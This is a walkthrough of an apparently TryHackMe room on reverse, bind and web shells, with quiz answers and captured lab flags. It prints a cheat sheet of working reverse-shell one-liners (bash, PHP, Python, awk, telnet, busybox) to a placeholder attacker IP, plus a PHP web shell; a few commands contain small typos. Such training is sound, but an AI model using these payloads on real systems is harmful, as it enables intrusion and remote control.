# Shells Overview

## [Task 1] Room Introduction

In cybersecurity, _shells_ are used by attackers to remotely control systems, so they're a very important part of the attack chain. We'll look at some different shells used in offensive security, their differences, and how they can be used. This can help enhance pentesting and exploitation skills, as well as help us understand how to detect when a remote shell is in use.

We'll want to be familiar with networking basics, web application security fundamentals, command lines, and scripting (Bash, Python, or PHP). Not focused on in this room is the use of Metasploit (or other frameworks) to generate or interact with shells, and this room will also be focused solely on Linux-based shells.

The VM and the AttackBox will be needed for this room.

## [Task 2] Shell Overview

A shell simply lets a user interact with an OS. This can be a graphical interface, but it typically is a command line interface. The specifics will depend on the operating system in use. In cybersecurity, a shell refers to a specific shell session an attacker uses when they get into a compromised system, letting them run commands and execute software.

With a shell, an attacker can do the following:
- Remotely control the system via commands and software
- Escalate privileges to "break out" of restricted/limited shells to get more access to the system
- Exfiltrate sensitive data out of the system
- Create persistence mechanisms (e.g. users and credentials, backdoors) to maintain access
- Perform post-exploitation activities, such as deploying malware, creating hidden accounts, and deleting system info
- Access other systems on the network and get to different targets, a.k.a. pivoting

**[Task 2, Question 1] What is the command-line interface that allows users to interact with an operating system?** - shell

**[Task 2, Question 2] What process involves using a compromisd system as a launching pad to attack other machines on the network?** - pivoting

**[Task 2, Question 3] What is a common activity attackers perform after obtaining shell access to escalate their privileges?** - privilege escalation

## [Task 3] Reverse Shell

A reverse shell is sometimes known as a "connect back shell", and it is one of the most popular techniques for gaining access to a system in cyberattacks. Connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other appliances.

Netcat is a tool that can be used to read and write data through a network, and it can be used to handle reverse shells. Reverse shells connect back to the attacker machine, so we can run the command `nc -lvnp (PORT_TO_CATCH_REVERSE_SHELL_ON)`.
- The `-l` option tells Netcat to listen, or wait for a connection.
- The `-v` option enables verbose mode.
- The `-n` option stops connections from using DNS for lookup; it will use IP addresses instead of resolving hostnames.
- The `-p` option indicaates the port that will be used to wait for the connection.

Any port can be used to wait for a connection. Attackers and pentesters tend to use known ports, though: 53, 80, 8080, 443, 139, and 445, among others. This helps blend the reverse shell in with legitimate traffic and avoid detection.

Once the listener is set, the attacker executes a reverse shell _payload_, which abuses the targeted vulnerability or unauthorized access gained by teh attacker and executes a command to expose the shell through the network. There's plenty of tools to accomplish this; see PentestMonkey's list.

Here's a pipe reverse shell: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc (ATTACKER_IP) (ATTACKER_PORT) >/tmp/f`.
- The `rm -f /tmp/f` command removes any existing named pipe files located at `/tmp/f`, letting the script create a new named pipe without conflicts.
- The `mkfifo /tmp/f` command creates a named, first-in-first-out, pipe at `/tmp/f`. This allows for two-way communication between processes, which in our case creates an input and output mechanism.
- `cat /tmp/f` reads data from the named pipe, and will wait for input that can be sent through the pipe.
- `| bash -i 2>&1` takes the output of `cat` and pipes it to a shell instance, letting the attacker execute commands interactively. Specifically, `2>&1` redirects standard error to standard output, ensuring error messages are sent back to the attacker.
- `| nc (ATTACKER_IP) (ATTACKER_PORT)` pipes the shell's output through `nc` to the attacker's IP address over the specified port.
- `>/tmp/f` sends the output of the commands back into the named pipe for bidirectional (two-way) communications.

This exposes the `bash` shell, in effect, to the desired listener. Onec this payload is executed, the attacker will receive a reverse shell in their `netcat` prompt, letting them execute commands as if they were logging in to a regular terminal on the target OS.

**[Task 3, Question 1] What type of shell allows an attacker to execute commands remotely after the target connects back?** - reverse shell

**[Task 3, Question 2] What tool is commonly used to set up a listener for a reverse shell?** - `netcat`

## [Task 4] Bind Shell

A bind shell binds a port on the compromised system and listens for a connection; when the connection happens, it will expose the shell session so the attacker can run commands remotely. This is good when a target will not permit outgoing connections, but this tends to be less popular since it needs to remain active and listening for connections - this can result in detection.

A bind shell can be created with a command like this: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`.
- The `rm -f /tmp/f` command removes any existing named pipe file located at `/tmp/f`, ensuring a named pipe can be made.
- The `mkfifo /tmp/f` command creates a named FIFO pipe at `/tmp/f`, allowing for two-way communiation (in this case, creating an input-output conduit).
- `cat /tmp/f` is used to read data from a named pipe. It waits for input that can be sent through the pipe.
- `| bash -i 2>&1` will pipe the output of `cat` to a shell instance (`bash -i`), letting the attacker execute commands remotely. The use of `2&1` ensures that error messages are sent back to the attacker.
- `| nc -l 0.0.0.0 8080` starts netcat in listen mode on all interfaces and port 8080, which will expose the shell to the attacker once they are connected to the port.
- `>/tmp/f` sends the commands' output back into the named pipe, allowing for bidirectional communication.

In essence, the target will listen for incoming connections and expose a bash shell. We can use any port we want for this, but typically ports below 1024 will require Netcat to be executed with elevated/sudo privileges, which you may or may not be able to get to on the target.

On the attacking machine, you'd connect to the bind shell by running `nc -nv (TARGET_IP) 8080`:
- `-n` disables DNS resolution as before. This makes netcat faster, since it doesn't actually do any lookups.
- `-v` enables verbose mode to provide detailed output of the connection, e.g. when it was established.

**[Task 4, Question 1] What type of shell opens a specific port on the target for incoming connections from the attacker?** - bind shell

**[Task 4, Question 2] Listening below which port number requires root access or privileged permissions?** - 1024

## [Task 5] Shell Listeners

Netcat is a pretty simply utility that handles reverse shell connections for us; this will let the attacker interact with the exposed shell. However, netcat is not the only utility that lets us do this. There are some other tools that will serve the same purpose.
- `rlwrap` uses the GNU `readline` library to provide editing keyboard and history. The command `rlwrap nc -lvnp (PORT)` will let us use arrow keys and history for better interactivity in the remote shell (these usually cannot be used by default).
- `ncat` is an improved version of netcat developed by the nmap project, including features like encryption over SSL. It can be run with `ncat --ssl -lvnp 4444`.
- `socat` lets you create a socket connection between two data sources - in our case, this will be the two hosts. The command `socat -d -d TCP-LISTEN:443 STDOUT` uses the `-d` option to enable verbose output, with multiple `-d` flags being used to increase verbosity. The `TCP-LISTEN:443` option creates a TCP listener over port 443. The `STDOUT` option directs any incoming data to the terminal.

**[Task 5, Question 1] Which flexible networking tool allows you to create a socket connection between two data sources?** - `socat`

**[Task 5, Question 2] Which command-line utility provides readline-style editing and command history for programs that lack it, enhancing the interaction with a shell listener?** - `rlwrap`

**[Task 5, Question 3] What is the improved version of netcat distributed with the nmap project that offers additional features like SSL support for listening to encrypted shells?** - `ncat`

## [Task 6] Shell Payloads

Shell payloads are commands and scripts that expose the shell to an incoming connection (for bind shells) or send a connection out (for reverse shells). What follows are some common reverse shells.

For Bash:
- Normal reverse shell: `bash -i >& /dev/tcp/(ATTACKER_IP)/(PORT) 0>&1` - redirects input and output through TCP connection to the attacker's IP on a given port. The `>&` operator combines standard output and error.
- Read line reverse shell: `exec 5<>/dev/tcp/(ATTACKER_IP)/(PORT); cat <&5 | while read line; do $line 2>&5 >&5; done` - creates a new file descriptor, 5 in this case, and connects to a TCP socket. Commands are read/executed via the socket, and output is sent back over the same socket.
- File descriptor 196 reverse shell: `0<&196;exec 196<>/dev/tcp/(ATTACKER_IP)/(PORT); sh <&196 >&196 2>&196` - the file descriptor 196 is used to establish a TCP connection, and the shell reads commands from the network and sends it back out the same connection.
- File descriptor 5 reverse shell: `bash -i 5<> /dev/tcp/(ATTACKER_IP)/(PORT) 0<&5 1>&5 2>&5` - opens a shell using a different file descriptor for input and output, enabling an interactive session over the TCP connection.

For PHP:
- Exec function reverse shell: `php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("sh <&3 >&3 2>&3");'` - creates a socket connection to the attacker's IP on a given port, and uses `exec` to execute a shell and redirect standard input/output
- Shell_exec reverse shell: `php -r '$sock=fsockopen("ATTACKER_IP",PORT);shell_exec("sh <&3 >&3 2>&3");'` - similar to previous command but uses the `shell_exec` function
- System reverse shell: `php -r '$sock=fsockopen("ATTACKER_IP",PORT);system("sh <&3 >&3 2>&3");'` - employs the `system` function to set up the reverse shell.
- Passthru reverse shell: `php -r '$sock=fsockopen("ATTACKER_IP",PORT);passthru("sh <&3 >&3 2>&3");'` - uses `passthru` to execute a command and send raw output back to the browser, which is useful when working with binary data
- Popen reverse shell: `php -r '$sock=fsockopen("ATTACKER_IP",PORT);popen("sh <&3 >&3 2>&3", "r");'` - uses `popen` to open a process file pointer, letting the shell be executed

For Python:
- Exporting environment variables: `export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'` - sets the remote host and port as environment variables, creates a socket, and duplicates the socket file descriptor for standard input/output
- The subprocess module: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'` - uses the `subprocess` module to spawn a shell and set up a similar environment as the previous
- Short reverse shell: `python -c import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'` - crates a socket, connects to attacker, and redirects standard input, output, error to the socket with `os.dup2()`.

Other utilities:
- Telnet shell: `TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP PORT 0<$TF | sh 1>$TF` - creates a named pipe and connects to the attacker via Telnet on the given IP and port.
- AWK shell: `awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` - this uses AWK's built-in TCP capabilities to connect to the attacking machine, read commands from the attacker, and executes them. The results are sent back over the same TCP connection.
- BusyBox shell: `busybox nc ATTACKER_IP PORT -e sh` - uses netcat to connect to the attacker at the IP and port. Once executed, it runs `/bin/sh` and exposes the command line to the attacker.

**[Task 6, Question 1] Which Python module is commonly used for managing shell commands and establishing reverse shell connections in security assessments?** - `subprocess`

**[Task 6, Question 2] What shell payload method in a common scripting language uses the `exec`, `shell_exec`, `system`, `passthru`, and `popen` functions to execute commands remotely through a TCP connection?** - PHP

**[Task 6, Question 3] Which scripting language can use a reverse shell by exporting environment variables and creating a socket connection?** - Python

## [Task 7] Web Shell

A web shell is a script written in a language supported by a compromised web server that executes commands via the web server itself. It's usually a file containing the code that executes commands and handles files, and can be hidden in a compromisd web app or service, making it hard to detect. This can be very popular among attackers.

Web shells may be written in many langauges supported by web servers, including PHP, ASP, JSP, and simple CGI scripts.

Here's an example PHP web shell:

```php
<?php
  if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

We can save this shell with a PHP extension and then upload it into the web server by exploiting unrestricted file upload, file inclusion, command injection, and other vulnerabilities. Or we can just gain unauthorized access to it.

When a web shell is deployed to the server, you can typically access it via the URL where the web shell is hosted, e.g. `uploads/shell.php`. With the code above we would have to provide a GET method and the value of the variable `cmd`, which contains the command the attacker wants to run. This might make our URL `uploads/shell.php?cmd=whoami`, executing the `whoami` command and displaying the result in the browser.

There are many web shells with lots of functionality that can be used to avoid detection. Some of the more popular ones include
- `p0wny-shell`, a minimalistic single-file PHP web shell allowing for RCE
- `b374k shell`, a more feature-rich PHP shell with file-management and command execution functionalities, among others
- `c99 shell`, a well-known and robust PHP web shell with extensive functionality

More web shells can be found on the web.

**[Task 7, Question 1] What vulnerability type allows attackers to upload a malicious script by failing to restrict file types?** - Unrestricted File Upload

**[Task 7, Question 2] What is a malicious script uploaded to a vulnerable web application to gain unauthorized access?** - web shell

## [Task 8] Practical Task

Now let's grab some flags! We can use our knowledge of the different types of reverse shells to help us here. The attached VM gives us access to three URLs
- MACHINE_IP:8080, the landing page
- MACHINE_IP:8081, the web app that's vulnerable to command injection
- MACHINE_IP:8082, the web app that's vulnerable to unrestricted file upload

We can access the above via the AttackBox or a machine of ours connected into the VPN.

For the first exercise, we'll need to use command injection. This just means we can run commands on the system when we really shouldn't. The `8081` URL is the target this time. You can tinker around with the different payloads described above, but I pasted the PHP shell_exec() reverse shell. You need to replace the IP and port with the ones that you want to use, and in this particular case, you need to enclose the command in semicolons.

![image](https://github.com/user-attachments/assets/aab31056-4e7d-4aad-9019-2646260ba615)

We can use all the usual commands, like `ls` and `cat`. Doing so reveals the `/flag.txt` file, and `cat`-ing it gives us the first flag.

![image](https://github.com/user-attachments/assets/28b2db27-8be0-4e61-9ae6-7ae32e56fa92)

**[Task 8, Question 1] Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the `/` directory?** - `THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}`

For this next question, we can go to the `8082` URL and attempt to upload a file to the system. We can use the shells described in the previous task to do the job. We'll grab the `p0wny-shell` shell (since it's just one file) and save it as `shell.php` - you can find it on GitHub. Once we save it, we can upload it to the website:

![image](https://github.com/user-attachments/assets/e2c44792-5d1e-4156-9a51-c6ddf8331d9f)

...and for some reason, this is totally OK with the web app that's expecting a CV document. Either way, we can go to `MACHINE_IP:8082/uploads/shell.php` - as called out by the hint - and we'll be able to interact with the web shell. As before, our flag is in `/flag.txt`:

![image](https://github.com/user-attachments/assets/1e9c1c55-7b43-4edc-a80f-80c21db5f5a1)

**[Task 8, Question 2] Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the `/` directory?** - `THM{202bb14ed12120b31300cfbbbdd35998786b44e5}`

## [Task 9] Conclusion

In this room, we learned about the different kinds of shells, how they're important for attackers, pentesters, and defenders, and how we can identify them. In short:
- Reverse shells send a connection from a compromised machine back to the attacker.
- Bind shells listen for incoming connections on a compromised machine.
- Web shells let attackers exploit vulnerabilities in web apps.
